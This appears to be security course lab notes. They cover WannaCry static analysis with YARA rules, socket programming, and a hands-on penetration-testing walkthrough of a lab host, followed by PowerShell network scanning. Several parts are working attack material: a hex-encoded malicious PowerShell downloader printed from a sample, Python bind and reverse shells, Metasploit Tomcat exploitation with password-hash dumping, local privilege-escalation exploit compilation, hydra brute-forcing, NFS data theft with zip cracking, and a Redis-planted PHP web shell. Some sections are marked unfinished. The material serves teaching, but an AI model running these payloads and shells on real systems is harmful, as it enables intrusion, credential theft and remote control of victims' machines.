+# Good references for WannaCry #
+################################
+
+References:
+
+https://gist.github.com/rain-1/989428fa5504f378b993ee6efbc0b168
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+
+
+
+############################
+# Download the Analysis VM #
+############################
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
+user: infosecaddicts
+pass: infosecaddicts
+
+
+
+- Log in to your Ubuntu system with the username 'infosecaddicts' and the password 'infosecaddicts'.
+
+
+
+
+
+
+################
+# The Scenario #
+################
+You've come across a file that has been flagged by one of your security products (AV Quarantine, HIPS, Spam Filter, Web Proxy, or digital forensics scripts).
+
+
+The fastest thing you can do is perform static analysis. 
+
+---------------------------Type This-----------------------------------
+
+sudo pip install olefile
+     strategicsec
+ 
+mkdir ~/Desktop/oledump
+ 
+cd ~/Desktop/oledump
+ 
+wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
+ 
+unzip oledump_V0_0_22.zip
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/064016.zip
+ 
+unzip 064016.zip
+     infected
+ 
+python oledump.py 064016.doc
+ 
+python oledump.py 064016.doc -s A4 -v
+ 
+- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams.
+- Three of the data streams are flagged as macros: A3:'VBA/Module1′, A4:'VBA/Module2′, A5:'VBA/ThisDocument'.
+ 
+ 
+python oledump.py 064016.doc -s A5 -v
+ 
+- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
+ 
+ 
+python oledump.py 064016.doc -s A3 -v
+-----------------------------------------------------------------------
+ 
+- Look for "GVhkjbjv" and you should see:
+ 
+636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
+ 
+- Take that long blob that starts with 636D and finishes with 653B and paste it in:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
+
+
+
+###################
+# Static Analysis #
+###################
+
+- After logging please open a terminal window and type the following commands:
+
+---------------------------Type This-----------------------------------
+
+cd Desktop/
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/wannacry.zip
+
+unzip wannacry.zip
+     infected
+
+file wannacry.exe
+
+mv wannacry.exe malware.pdf
+
+file malware.pdf
+
+mv malware.pdf wannacry.exe
+ 
+hexdump -n 2 -C wannacry.exe
+-----------------------------------------------------------------------
+ 
+
+
+
+***What is '4d 5a' or 'MZ'***
+Reference: 
+http://www.garykessler.net/library/file_sigs.html
+ 
+
+
+---------------------------Type This-----------------------------------
+
+
+objdump -x wannacry.exe
+ 
+strings wannacry.exe
+
+strings --all wannacry.exe | head -n 6
+ 
+strings wannacry.exe | grep -i dll
+ 
+strings wannacry.exe | grep -i library
+
+strings wannacry.exe | grep -i reg
+
+strings wannacry.exe | grep -i key
+
+strings wannacry.exe | grep -i rsa
+
+strings wannacry.exe | grep -i open
+
+strings wannacry.exe | grep -i get
+
+strings wannacry.exe | grep -i mutex
+
+strings wannacry.exe | grep -i irc
+
+strings wannacry.exe | grep -i join			
+
+strings wannacry.exe | grep -i admin
+
+strings wannacry.exe | grep -i list
+
+-----------------------------------------------------------------------
+
+
+
+
+
+
+
+ 
+
+
+Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"
+
+Quick Google search for "wannacry ransomeware analysis"
+
+
+Reference
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+
+- Yara Rule - 
+
+
+Strings:
+$s1 = "Ooops, your files have been encrypted!" wide ascii nocase
+$s2 = "Wanna Decryptor" wide ascii nocase
+$s3 = ".wcry" wide ascii nocase
+$s4 = "WANNACRY" wide ascii nocase
+$s5 = "WANACRY!" wide ascii nocase
+$s7 = "icacls . /grant Everyone:F /T /C /Q" wide ascii nocase
+
+
+
+
+
+
+
+
+Ok, let's look for the individual strings
+
+---------------------------Type This-----------------------------------
+
+
+strings wannacry.exe | grep -i ooops
+
+strings wannacry.exe | grep -i wanna
+
+strings wannacry.exe | grep -i wcry
+
+strings wannacry.exe | grep -i wannacry
+
+strings wannacry.exe | grep -i wanacry			**** Matches $s5, hmmm.....
+
+-----------------------------------------------------------------------
+
+
+
+
+
+
+####################################
+# Tired of GREP - let's try Python #
+####################################
+Decided to make my own script for this kind of stuff in the future. I
+
+Reference1:
+https://s3.amazonaws.com/infosecaddictsfiles/analyse_malware.py
+
+This is a really good script for the basics of static analysis
+
+Reference:
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+
+
+This is really good for showing some good signatures to add to the Python script
+
+
+Here is my own script using the signatures (started this yesterday, but still needs work):
+https://pastebin.com/guxzCBmP
+
+
+---------------------------Type This-----------------------------------
+
+
+sudo apt install -y python-pefile
+     strategicsec
+
+
+
+wget https://pastebin.com/raw/guxzCBmP
+
+
+mv guxzCBmP am.py
+
+
+vi am.py
+
+python am.py wannacry.exe
+
+-----------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+##############
+# Yara Ninja #
+##############
+
+---------------------------Type This-----------------------------------
+
+cd ~/Desktop
+
+sudo apt-get remove -y yara
+     infosecaddcits
+
+sudo apt -y install libtool
+     strategicsec
+
+wget https://github.com/VirusTotal/yara/archive/v3.6.0.zip
+
+
+unzip v3.6.0.zip
+
+cd yara-3.6.0
+
+./bootstrap.sh
+
+./configure
+
+make
+
+sudo make install
+	strategicsec
+
+yara -v
+
+cd ~/Desktop
+-----------------------------------------------------------------------
+
+
+
+
+NOTE:
+McAfee is giving these yara rules - so add them to the hashes.txt file
+
+Reference:
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+
+----------------------------------------------------------------------------
+rule wannacry_1 : ransom
+{
+	meta:
+		author = "Joshua Cannell"
+		description = "WannaCry Ransomware strings"
+		weight = 100
+		date = "2017-05-12"
+ 
+	strings:
+		$s1 = "Ooops, your files have been encrypted!" wide ascii nocase
+		$s2 = "Wanna Decryptor" wide ascii nocase
+		$s3 = ".wcry" wide ascii nocase
+		$s4 = "WANNACRY" wide ascii nocase
+		$s5 = "WANACRY!" wide ascii nocase
+		$s7 = "icacls . /grant Everyone:F /T /C /Q" wide ascii nocase
+ 
+	condition:
+		any of them
+}
+
+----------------------------------------------------------------------------
+rule wannacry_2{
+	meta:
+		author = "Harold Ogden"
+		description = "WannaCry Ransomware Strings"
+		date = "2017-05-12"
+		weight = 100
+
+	strings:
+		$string1 = "msg/m_bulgarian.wnry"
+		$string2 = "msg/m_chinese (simplified).wnry"
+		$string3 = "msg/m_chinese (traditional).wnry"
+		$string4 = "msg/m_croatian.wnry"
+		$string5 = "msg/m_czech.wnry"
+		$string6 = "msg/m_danish.wnry"
+		$string7 = "msg/m_dutch.wnry"
+		$string8 = "msg/m_english.wnry"
+		$string9 = "msg/m_filipino.wnry"
+		$string10 = "msg/m_finnish.wnry"
+		$string11 = "msg/m_french.wnry"
+		$string12 = "msg/m_german.wnry"
+		$string13 = "msg/m_greek.wnry"
+		$string14 = "msg/m_indonesian.wnry"
+		$string15 = "msg/m_italian.wnry"
+		$string16 = "msg/m_japanese.wnry"
+		$string17 = "msg/m_korean.wnry"
+		$string18 = "msg/m_latvian.wnry"
+		$string19 = "msg/m_norwegian.wnry"
+		$string20 = "msg/m_polish.wnry"
+		$string21 = "msg/m_portuguese.wnry"
+		$string22 = "msg/m_romanian.wnry"
+		$string23 = "msg/m_russian.wnry"
+		$string24 = "msg/m_slovak.wnry"
+		$string25 = "msg/m_spanish.wnry"
+		$string26 = "msg/m_swedish.wnry"
+		$string27 = "msg/m_turkish.wnry"
+		$string28 = "msg/m_vietnamese.wnry"
+
+
+	condition:
+		any of ($string*)
+}
+----------------------------------------------------------------------------
+
+
+#######################
+# External DB Lookups #
+#######################
+
+Creating a malware database (sqlite)
+
+---------------------------Type This-----------------------------------
+
+sudo apt install -y python-simplejson python-simplejson-dbg
+	strategicsec
+
+
+
+wget https://raw.githubusercontent.com/mboman/mart/master/bin/avsubmit.py
+
+
+
+python avsubmit.py -f wannacry.exe -e
+
+-----------------------------------------------------------------------
+
+Analysis of the file can be found at: 
+http://www.threatexpert.com/report.aspx?md5=84c82835a5d21bbcf75a61706d8ab549
+
+
+
+
+
+
+
+
+
+###############################
+# Creating a Malware Database #
+###############################
+Creating a malware database (mysql)
+-----------------------------------
+- Step 1: Installing MySQL database
+- Run the following command in the terminal:
+
+---------------------------Type This-----------------------------------
+
+sudo apt install -y mysql-server
+     strategicsec
+	 
+- Step 2: Installing Python MySQLdb module
+- Run the following command in the terminal:
+
+sudo apt-get build-dep python-mysqldb
+     strategicsec
+
+sudo apt install -y python-mysqldb
+     strategicsec
+
+- Step 3: Logging in 
+- Run the following command in the terminal:
+
+mysql -u root -p					(set a password of 'malware')
+
+- Then create one database by running following command:
+
+create database malware;
+
+exit;
+
+wget https://raw.githubusercontent.com/dcmorton/MalwareTools/master/mal_to_db.py
+
+vi mal_to_db.py						(fill in database connection information)
+
+python mal_to_db.py -i
+
+------- check it to see if the files table was created ------
+
+mysql -u root -p
+	malware
+
+show databases;
+
+use malware;
+
+show tables;
+
+describe files;
+
+exit;
+
+---------------------------------
+
+
+- Now add the malicious file to the DB
+
+python mal_to_db.py -f wannacry.exe -u
+
+
+
+- Now check to see if it is in the DB
+
+mysql -u root -p
+	malware
+
+mysql> use malware;
+
+select id,md5,sha1,sha256,time FROM files;
+
+mysql> quit;
+
+
+--------------------------------------------------------------------------------------
+$ sudo /sbin/iptables -F
+ 
+$ ncat -l -v -p 1234
+ 
+ 
+ 
+ 
+--open another terminal--
+python
+ 
+>>> import socket
+>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+>>> s.connect(('localhost', 1234))
+>>> s.send('Hello, world')
+>>> data = s.recv(1024)
+>>> s.close()
+ 
+>>> print 'Received', data
+ 
+ 
+ 
+ 
+ 
+ 
+########################################
+# Lesson 18: TCP Client and TCP Server #
+########################################
+
+---------------------------Type This-----------------------------------
+ 
+vi tcpclient.py
+ 
+ 
+---------------------------Paste This-----------------------------------
+
+#!/usr/bin/python
+# tcpclient.py
+ 
+import socket
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+hostport = ("127.0.0.1", 1337)
+s.connect(hostport)
+s.send("Hello\n")
+buf = s.recv(1024)
+print "Received", buf
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+vi tcpserver.py
+ 
+ 
+ 
+---------------------------Paste This-----------------------------------
+ 
+ 
+#!/usr/bin/python
+# tcpserver.py
+ 
+import socket
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+hostport = ("", 1337)
+s.bind(hostport)
+s.listen(10)
+while 1:
+    cli,addr = s.accept()
+    print "Connection from", addr
+    buf = cli.recv(1024)
+    print "Received", buf
+    if buf == "Hello\n":
+        cli.send("Server ID 1\n")
+    cli.close()
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+ 
+python tcpserver.py
+ 
+ 
+--open another terminal--
+python tcpclient.py
+ 
+ 
+########################################
+# Lesson 19: UDP Client and UDP Server #
+########################################
+
+---------------------------Type This-----------------------------------
+ 
+vi udpclient.py
+ 
+ 
+ 
+ 
+---------------------------Paste This-----------------------------------
+ 
+ 
+#!/usr/bin/python
+# udpclient.py
+ 
+import socket
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+hostport = ("127.0.0.1", 1337)
+s.sendto("Hello\n", hostport)
+buf = s.recv(1024)
+print buf
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+ 
+vi udpserver.py
+ 
+ 
+ 
+---------------------------Paste This-----------------------------------
+ 
+ 
+ 
+#!/usr/bin/python
+# udpserver.py
+ 
+import socket
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+hostport = ("127.0.0.1", 1337)
+s.bind(hostport)
+while 1:
+    buf, address = s.recvfrom(1024)
+    print buf
+    if buf == "Hello\n":
+        s.sendto("Server ID 1\n", address)
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+ 
+python udpserver.py
+ 
+ 
+--open another terminal--
+python udpclient.py
+ 
+ 
+ 
+######################################
+# Lesson 20: Bind and Reverse Shells #
+######################################
+
+---------------------------Type This-----------------------------------
+
+vi simplebindshell.py
+ 
+---------------------------Paste This-----------------------------------
+ 
+#!/bin/python
+import os,sys,socket
+ 
+ls = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+print '-Creating socket..'
+port = 31337
+try:
+    ls.bind(('', port))
+    print '-Binding the port on '
+    ls.listen(1)
+    print '-Listening, '
+    (conn, addr) = ls.accept()
+    print '-Waiting for connection...'
+    cli= conn.fileno()
+    print '-Redirecting shell...'
+    os.dup2(cli, 0)
+    print 'In, '
+    os.dup2(cli, 1)
+    print 'Out, '
+    os.dup2(cli, 2)
+    print 'Err'
+    print 'Done!'
+    arg0='/bin/sh'
+    arg1='-a'
+    args=[arg0]+[arg1]
+    os.execv(arg0, args)
+except(socket.error):
+    print 'fail\n'
+    conn.close()
+    sys.exit(1)
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+nc TARGETIP 31337
+ 
+ 
+ 
+---------------------
+- Preparing the target for a reverse shell
+$ ncat -lvp 4444
+ 
+ 
+ 
+--open another terminal--
+wget https://www.trustedsec.com/files/simple_py_shell.py
+ 
+vi simple_py_shell.py
+ 
+ 
+ 
+ 
+ 
+ 
+-------------------------------
+Tricky shells
+ 
+Reference:
+http://securityweekly.com/2011/10/python-one-line-shell-code.html
+http://resources.infosecinstitute.com/creating-undetectable-custom-ssh-backdoor-python-z/
+
+
+
+--------------------------------------------------------------------------------------------------------------
+
+
+# Reverse Shell in Python 2.7 #
+###############################
+
+We'll create 2 python files. One for the server and one for the client.
+
+- Below is the python code that is running on victim/client Windows machine:
+
+---------------------------------------------------------------------
+
+# Client
+
+import socket # For Building TCP Connection
+import subprocess # To start the shell in the system
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.243.150',8080))
+
+    while True:                         #keep receiving commands
+        command = s.recv(1024)
+
+        if 'terminate' in command:
+            s.close() #close the socket
+            break
+
+        else:
+
+            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            s.send( CMD.stdout.read()  )  # send the result
+            s.send( CMD.stderr.read()  )  # incase you mistyped a command.
+            # we will send back the error
+
+def main ():
+    connect()
+main()
+
+
+----------------------------------------------------------------------------------------------------------------
+
+- Below is the code that we should run on server unit, in our case strategicsec Ubuntu machine ( Ubuntu IP: 192.168.243.150 )
+
+---------------------------------------------------------------------------
+
+# Server
+
+import socket # For Building TCP Connection
+
+
+def connect ():
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("192.168.243.150", 8080))
+    s.listen(1)
+    conn, addr = s.accept()
+    print '[+] We got a connection from:  ', addr
+
+
+    while True:
+         command = raw_input("Shell> ")
+
+         if 'terminate' in command:
+             conn.send('termminate')
+             conn.cloe()  # close the connection with host
+             break
+
+         else:
+             conn.send(command)   #send command
+             print conn.recv(1024)
+
+def main ():
+    connect()
+main()
+
+--------------------------------------------------------------------------
+
+- First run server.py code from Ubuntu machine. From command line type:
+
+---------------------------Type This-----------------------------------
+
+python server.py
+
+
+- then check if 8080 port is open, and if we are listening on 8080:
+
+
+netstat -antp | grep "8080"
+
+
+--------------------------
+
+- Then on victim ( Windows ) unit run client.py code.
+
+
+- Connection will be established, and you will get a shell on Ubuntu:
+
+infosecaddicts@ubuntu:~$ python server.py
+[+] We got a connection from:   ('192.168.243.1', 56880)
+Shell> arp -a
+
+Shell> ipconfig
+
+Shell> dir
+-------------------------------------------------------------------------------------------------------------------------
+
+
+So, let's start with some lab fun (just a little bit)...lol. Here are the instructions for connecting to the VPN:
+https://s3.amazonaws.com/infosecaddictsfiles/InfoSecAddicts-VPN-2018-Info.pdf
+user: 	userX (user1, user2, user3, user4, user5, user6)
+pass: 	--------
+
+
+
+
+
+
+
+
+
+#########################
+# Building a quick list #
+#########################
+
+---------------------------Type This-----------------------------------
+
+cd ~
+echo bob >> list.txt
+echo jim >> list.txt
+echo joe >> list.txt
+echo tim >> list.txt
+echo admin >> list.txt
+echo hello >> list.txt
+echo rob >> list.txt
+echo test >> list.txt
+echo aaaaaa >> list.txt
+echo larry >> list.txt
+echo mario >> list.txt
+echo jason >> list.txt
+echo john >> list.txt
+
+-----------------------------------------------------------------------
+
+
+
+Attack steps:
+-------------
+ 
+
+Step 1: Ping sweep the target network
+-------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+nmap -sP 172.31.2.0/24
+-----------------------------------------------------------------------
+ 
+Found 5 hosts:
+172.31.2.24
+172.31.2.64
+172.31.2.117
+172.31.2.217
+172.31.2.238 
+ 
+Step 2: Port scan target system
+-------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+sudo nmap -sV 172.31.2.24
+-----------------------------------------------------------------------
+ 
+
+ 
+ 
+ 
+ 
+Step 3: Vulnerability Scan the webserver
+----------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.24
+-----------------------------------------------------------------------
+
+
+
+ 
+ 
+Step 4: Run dirbuster or similar directory bruteforce tool against the target
+-----------------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+wget https://dl.packetstormsecurity.net/UNIX/cgi-scanners/Webr00t.pl
+ 
+perl Webr00t.pl -h 172.31.2.24 -v | grep -v "404 Not Found"
+-----------------------------------------------------------------------
+ 
+
+ 
+ 
+Step 5: Browse the web site to look for clues
+---------------------------------------------
+Since no glaring vulnerabilities were found with the scanner - we start just looking around the website itself
+
+
+
+###############
+# Using Nikto #
+###############
+
+---------------------------Type This-----------------------------------
+
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.24
+ 
+perl nikto.pl -h 172.31.2.24:8080
+ 
+perl nikto.pl -h 172.31.2.24:8081
+ 
+perl nikto.pl -h 172.31.2.24:9000
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+####################
+# Using Metasploit #
+####################
+
+---------------------------Type This-----------------------------------
+
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use auxiliary/scanner/http/http_version        
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+ 
+ 
+-------------------------------
+ 
+use auxiliary/scanner/http/tomcat_enum          
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+ 
+ 
+ 
+ 
+ 
+####################
+# Attacking Tomcat #
+####################
+
+---------------------------Type This-----------------------------------
+
+use auxiliary/scanner/http/http_version        
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+ 
+ 
+-------------------------------
+ 
+ 
+use auxiliary/scanner/http/tomcat_mgr_login          
+ 
+set USERNAME tomcat
+ 
+set USERPASS_FILE /home/strategicsec/list.txt
+ 
+set STOP_ON_SUCCESS true
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+ 
+ 
+-------------------------------
+ 
+use exploit/multi/http/tomcat_mgr_upload
+ 
+set HttpUsername tomcat
+ 
+set HttpPassword tomcat
+ 
+set RHOST 172.31.2.24
+ 
+set RPORT 8080
+ 
+set PATH /manager/html
+ 
+set PAYLOAD linux/x86/meterpreter/bind_tcp
+ 
+exploit
+ 
+ 
+run post/linux/gather/checkvm
+ 
+run post/linux/gather/enum_configs
+ 
+run post/linux/gather/enum_protections
+ 
+run post/linux/gather/enum_system
+ 
+run post/linux/gather/enum_users_history
+ 
+run post/linux/gather/hashdump
+ 
+shell
+ 
+/bin/bash
+ 
+id
+ 
+uname -a
+ 
+dpkg -l
+ 
+cd /tmp
+ 
+pwd
+ 
+ 
+cat >> exploit.c << out
+ 
+**************paste in the content from here *****************
+https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/39166.c
+ 
+ 
+------ hit enter a few times ------
+ 
+------ then type 'out' ----- this closes the file handle...
+ 
+ 
+gcc -o boom exploit.c
+ 
+./boom
+ 
+id
+ 
+ 
+-------------------------------
+ 
+ 
+hydra -l tomcat -P /home/strategicsec/list.txt -e ns -s 8080 -vV 172.31.2.24 http-get /manager/html
+
+
+#################
+# Attacking FTP #
+#################
+
+---------------------------Type This-----------------------------------
+
+sudo nmap -sV -Pn -p25 --script=banner,ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 172.31.2.24
+ 
+cd ~/toolz/hydra
+ 
+hydra -l admin -P /home/strategicsec/list.txt -u -s 25 172.31.2.24 ftp
+ 
+ftp
+open 172.31.2.24
+admin
+admin
+pwd
+ls -lah
+ 
+ls ../../
+ 
+ 
+#################
+# Attacking SSH #
+#################
+
+---------------------------Type This-----------------------------------
+
+cd ~/toolz/hydra
+ 
+hydra -L /home/strategicsec/list.txt -P /home/strategicsec/list.txt -u -s 1322 172.31.2.24 ssh
+ 
+ssh -p 1322 admin@172.31.2.24
+ 
+ 
+ 
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use auxiliary/scanner/ssh/ssh_users          
+ 
+set USER_FILE /home/strategicsec/list.txt
+ 
+set STOP_ON_SUCCESS true
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 1322
+ 
+run
+ 
+ 
+ 
+ 
+ 
+use auxiliary/scanner/ssh/ssh_login          
+ 
+set USER_FILE /home/strategicsec/list.txt
+ 
+set PASS_FILE /home/strategicsec/list.txt
+ 
+set STOP_ON_SUCCESS true
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 1322
+ 
+run
+ 
+ 
+sessions -l
+ 
+sessions -u 1
+ 
+sessions -i 1
+ 
+id
+ 
+ 
+ 
+########################
+# Attacking phpMyAdmin #
+########################
+****** This section isn't finished ******
+
+---------------------------Type This-----------------------------------
+ 
+hydra -l root -P /home/strategicsec/list.txt -e n http-post-form://172.31.2.24 -m "/phpMyAdmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:S=information_schema"
+-----------------------------------------------------------------------
+ 
+****** This section isn't finished ******
+ 
+Google is your friend hahahahahahahah........
+ 
+---------------------------Type This-----------------------------------
+ 
+cd ~ 
+ 
+wget https://repo.palkeo.com/repositories/mysterie.fr/prog/darkc0de/others/pmabf.py
+ 
+python pmabf.py http://172.31.2.24 root list.txt        (this gave me the WRONG password)
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+####################
+# Attacking Joomla #
+####################
+
+---------------------------Type This-----------------------------------
+
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use use auxiliary/scanner/http/joomla_plugins            
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+ 
+ 
+****** This section isn't finished ******
+Google is your friend hahahahahahahah........
+ 
+#####################
+# Attacking Jenkins #
+#####################
+ 
+ 
+****** This section isn't finished ******
+Google is your friend hahahahahahahah........
+ 
+#################
+# Attacking NFS #
+#################
+
+---------------------------Type This-----------------------------------
+
+sudo apt install -y rpcbind nfs-common
+     strategicsec
+ 
+rpcinfo -s 172.31.2.24
+ 
+showmount -e 172.31.2.24
+ 
+sudo /bin/bash
+ 
+mkdir /tmp/nfs
+ 
+mount -t nfs 172.31.2.24:/backup /tmp/nfs -o nolock
+ 
+ls /tmp/nfs
+ 
+cp /tmp/nfs/backup.tar.bz2.zip /home/strategicsec
+ 
+umount -l /tmp/nfs
+ 
+exit
+ 
+sudo apt-cache search fcrackzip
+ 
+sudo apt-get install -y fcrackzip
+ 
+fcrackzip -u backup.tar.bz2.zip
+ 
+unzip -P aaaaaa backup.tar.bz2.zip
+ 
+tar jxf backup.tar.bz2
+ 
+ 
+###################
+# Attacking Redis #
+###################
+
+---------------------------Type This-----------------------------------
+
+sudo nmap -p 6379 --script=redis-info 172.31.2.24
+    strategicsec
+ 
+sudo apt-get install -y redis-tools
+    
+ 
+redis-cli -h 172.31.2.24
+ 
+CONFIG SET dir /var/www/html/main
+ 
+CONFIG GET dir
+ 
+config set dbfilename boom.php
+ 
+CONFIG GET dbfilename
+ 
+SET cmd "<?php system($_GET['joe']); ?>"
+ 
+BGSAVE
+ 
+http://172.31.2.24/boom.php
+ 
+http://172.31.2.24/boom.php?joe=id
+ 
+ 
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt/.ssh"
+ 
+ 
+ 
+****** This section isn't finished ******
+Google is your friend hahahahahahahah........
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use auxiliary/scanner/redis/file_upload
+ 
+set RHOSTS 172.31.2.24
+ 
+set LocalFile
+ 
+****** This section isn't finished ******
+
+
+
+#######################
+# VMs for this course #
+#######################
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/Win7x64.zip
+	username: workshop
+	password: password
+	
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
+user:      infosecaddicts
+pass:      infosecaddicts
+
+You don't have to, but you can do the updates in the Win7 VM (yes, it is a lot of updates).
+
+You'll need to create directory in the Win7 VM called "c:\ps"
+
+In this file you will also need to change the text '192.168.150.129' to the IP address of your Ubuntu host.
+
+
+
+########################################
+# Basic Network Commands in PowerShell #
+########################################
+
+Reference:
+https://blogs.technet.microsoft.com/josebda/2015/04/18/windows-powershell-equivalents-for-common-networking-commands-ipconfig-ping-nslookup/
+
+
+###################
+# Pentester Tasks #
+###################
+Reference:
+http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/02/use-powershell-for-network-host-and-port-discovery-sweeps.aspx
+
+
+Listing IPs
+-----------
+One of the typical ways for working with IP addressed in most scripts is to work with an octet and then increase the last one
+
+------------------------Type This------------------------------
+$octect = "192.168.150."
+$lastoctect = (1..255)
+$lastoctect | ForEach-Object {write-host "$($octect)$($_)"}
+---------------------------------------------------------------
+
+
+Ping Sweep
+------------------------------------------------------
+PowerShell provides several methods for doing Ping
+Test-Connection cmdlet
+Creation of a WMI Object
+.Net System.Net.NetworkInformation.Ping Object
+------------------------------------------------------
+
+
+------------------------Type This------------------------------
+function New-IPRange ($start, $end) {
+$ip1 = ([System.Net.IPAddress]$start).GetAddressBytes()
+[Array]::Reverse($ip1)
+$ip1 = ([System.Net.IPAddress]($ip1 -join '.')).Address
+
+$ip2 = ([System.Net.IPAddress]$end).GetAddressBytes()
+[Array]::Reverse($ip2)
+$ip2 = ([System.Net.IPAddress]($ip2 -join '.')).Address
+
+for ($x=$ip1; $x -le $ip2; $x++) {
+$ip = ([System.Net.IPAddress]$x).GetAddressBytes()
+[Array]::Reverse($ip)
+$ip -join '.'
+}
+}
+$ping = New-Object System.Net.NetworkInformation.Ping
+New-IPRange 192.168.150.1 192.168.150.150 | ForEach-Object {$ping.Send($_, 100)} | where {$_.status -eq "Success"}
+---------------------------------------------------------------
+
+
+Reverse Lookups
+---------------
+For reverse lookups using .Net Class we use the [System.Net.Dns]::GetHostEntry(IP) method Returns System.Net.IPHostEntry
+
+
+
+Forward Lookups
+---------------
+
+------------------------Type This------------------------------
+[System.Net.Dns]::GetHostAddresses("www.google.com")
+---------------------------------------------------------------
+
+
+Port Scans
+----------
+To test if a port is open on a remote host in PowerShell the best method is to use the .Net abstraction that it provides to Windows Socket library
+For TCP the .Net System.Net.Sockets.TcpClient
+For UDP the .Net System.Net.Sockets.UdpClient
+
+
+
+
+TCP Scan
+--------
+
+------------------------Type This------------------------------
+$ports=22,80,443,3389
+$target = "192.168.150.129"
+foreach ($i in $ports) {
+try {
+$socket = new-object System.Net.Sockets.TCPClient($target, $i);
+} catch {}
+if ($socket -eq $NULL) {
+echo "$target:$i - Closed";
+} else {
+echo "$target:$i - Open";
+$socket = $NULL;
+}}
+---------------------------------------------------------------
+
+
+
+
+##########################
+# Parsing Nmap XML Files #
+##########################
+If you are NOT using the Win7 VM provided then you can get the required files for this lab which are located in this zip file:
+https://s3.amazonaws.com/infosecaddictsfiles/PowerShell-Files.zip
+
+
+
+
+Run Powershell as administrator
+------------------------Type This------------------------------
+cd C:\
+
+Get-ExecutionPolicy
+Set-ExecutionPolicy Unrestricted –Force
+---------------------------------------------------------------
+
+
+Parse nmap XML
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml
+---------------------------------------------------------------
+
+
+Process all XML files
+------------------------Type This------------------------------
+.\parse-nmap.ps1 *.xml
+---------------------------------------------------------------
+
+Piping also works
+------------------------Type This------------------------------
+dir *.xml | .\parse-nmap.ps1
+---------------------------------------------------------------
+
+Advanced parsing with filtering conditions
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml | where {$_.OS -like "*Windows XP*"} | format-table IPv4,HostName,OS
+---------------------------------------------------------------
+
+
+More parsing
+------------------------Type This------------------------------
